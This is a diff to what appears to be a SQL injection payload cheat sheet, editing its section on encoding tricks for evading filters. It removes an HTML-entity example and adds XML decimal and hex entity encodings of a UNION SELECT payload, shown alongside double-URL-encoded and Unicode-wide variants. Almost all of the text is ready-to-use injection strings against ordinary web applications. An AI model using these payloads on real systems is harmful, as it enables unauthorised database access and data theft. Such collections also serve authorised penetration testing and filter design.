@@ -242,16 +242,16 @@ SELECT%2520*%2520FROM%2520users
 
 -- Unicode-wide characters
 SELECT+%u0055NION+%u0053ELECT+1,2,3--
--- HTML Entities (rare edge case)
--- **Note:** SQL Server does NOT decode HTML entities. This only works if a proxy,
--- middleware, or custom parser decodes entities before building the SQL query.
--- Not generally effective unless such decoding occurs earlier in the pipeline.
+-- XML Entity Encoding (for injection into XML contexts)
+-- **Note:** This only works when injecting into XML input (SOAP APIs, XML web
+-- services, etc.) where an XML parser decodes entities before SQL execution.
+-- Does NOT work for regular form/query string injection.
 
--- Raw input (decodes to: AND 1=1):
-%26%2365%3B%26%2778%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
+-- Decimal entities (1 UNION SELECT NULL becomes):
+&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;
 
--- Or in a query context:
--- ' OR %26%2365%3B%26%2778%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B 1=1--
+-- Hex entities (same payload):
+&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
 
 #### Breaking Up Keywords
 
